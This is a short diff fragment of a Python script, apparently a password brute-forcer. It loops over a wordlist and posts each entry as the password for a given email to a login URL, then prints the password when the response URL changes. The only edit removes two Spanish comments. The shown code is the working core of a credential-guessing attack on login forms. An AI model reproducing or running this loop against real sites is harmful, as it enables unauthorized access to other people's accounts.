@@ -37,8 +37,8 @@ for lines in wordlists:
 	"email" : username,
 	"pass" : line
 		
-	} #los datos que le enviaremos
-	send_data_url = requests.post(url, data=data)#enviando los datos anteriores
+	} 
+	send_data_url = requests.post(url, data=data)
 	if send_data_url.url != url :
 		print("[\033[32;1m+\033[0m] password : "+line)
 		input("[Enter] press Enter to continue...")
